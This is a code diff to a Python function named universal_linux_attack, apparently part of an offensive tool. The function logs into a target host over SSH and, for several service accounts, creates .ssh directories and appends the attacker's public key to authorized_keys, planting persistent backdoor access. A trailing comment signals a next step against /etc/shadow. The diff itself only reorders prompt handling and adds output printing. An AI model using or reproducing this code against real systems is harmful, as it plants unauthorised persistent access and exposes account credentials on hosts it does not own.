@@ -100,7 +100,7 @@ def universal_linux_attack(host):
         "php" : "/home/php"
     }
     ssh_pub_key = get_ssh_pub()
-
+    ssh.prompt()
     for user, directory in user_directories.items():
         sshdir_make_cmd = "mkdir -p {}".format(directory)
         sshdir_perms_cmd = "chmod 700 {1} && chown {0}:{0} {1}".format(user, directory)
@@ -113,10 +113,11 @@ def universal_linux_attack(host):
         authorized_perms_cmd = "chmod 600 {1} && chown {0}:{0} {1}".format(user, authorized_keys_file)
         
         commands_to_run = [sshdir_make_cmd, sshdir_perms_cmd, ssh_add_cmd, authorized_perms_cmd]
-
-        for command in commands_to_run:
-            ssh.prompt()
+        for command in commands_to_run:  
             ssh.sendline(command)
+            ssh.prompt()
+            print(ssh.before.encode('utf8'))
+
     
     
     # ez mode /etc/shadow
